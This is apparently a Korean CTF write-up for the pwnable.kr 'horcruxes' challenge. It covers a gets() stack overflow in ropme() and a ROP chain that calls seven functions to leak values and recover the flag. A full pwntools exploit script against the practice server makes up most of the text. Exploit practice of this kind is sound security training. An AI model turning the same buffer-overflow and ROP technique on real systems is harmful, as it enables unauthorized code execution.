# [pwnable.kr] horcruxes

> Voldemort concealed his splitted soul inside 7 horcruxes.
> Find all horcruxes, and ROP it!
> author: jiwon choi
>
> ssh horcruxes@pwnable.kr -p2222 (pw:guest)
>
> [Attachment](./attachment)

## Bug

![image](https://github.com/user-attachments/assets/0b9bc9c6-cf3c-4904-aaaa-6115016c092b)

`ropme()`의 `gets(s)`에서 stack buffer overflow가 발생한다.

## Exploit

`ropme()`의 return address를 플래그를 읽어와서 출력하는 코드의 주소로 덮으면 될 것 같지만, 주소에 `0x0a`가 포함되기 때문에 불가능하다. 대신 `A()`부터 `G()`까지 모두 호출하여 `a`부터 `g`까지의 값을 알아낸 후 `sum`을 알맞게 입력하면 플래그를 획득할 수 있다.

```python
# ex.py

from pwn import *

r = remote("pwnable.kr", 9032)

sla = r.sendlineafter

A = 0x809FE4B  # A()
B = 0x809FE6A  # B()
C = 0x809FE89  # C()
D = 0x809FEA8  # D()
E = 0x809FEC7  # E()
F = 0x809FEE6  # F()
G = 0x809FF05  # G()
main = 0x809FF24  # main()

sla(b"Select Menu:", b"0")

payload = b"A" * 0x78
payload += p32(A)
payload += p32(B)
payload += p32(C)
payload += p32(D)
payload += p32(E)
payload += p32(F)
payload += p32(G)
payload += p32(main + 216)  # call ropme

sla(b"How many EXP did you earned? : ", payload)

r.recvuntil(b"EXP +")
a = int(r.recvuntil(b")")[:-1])

r.recvuntil(b"EXP +")
b = int(r.recvuntil(b")")[:-1])

r.recvuntil(b"EXP +")
c = int(r.recvuntil(b")")[:-1])

r.recvuntil(b"EXP +")
d = int(r.recvuntil(b")")[:-1])

r.recvuntil(b"EXP +")
e = int(r.recvuntil(b")")[:-1])

r.recvuntil(b"EXP +")
f = int(r.recvuntil(b")")[:-1])

r.recvuntil(b"EXP +")
g = int(r.recvuntil(b")")[:-1])

sum = a + b + c + d + e + f + g
if sum > 0x7FFFFFFF:
    sum -= 0x100000000

sla(b"Select Menu:", b"0")
sla(b"How many EXP did you earned? : ", str(sum).encode())

r.interactive()
```

![image](https://github.com/user-attachments/assets/13886f51-f545-45c6-a400-733c2a92eae3)
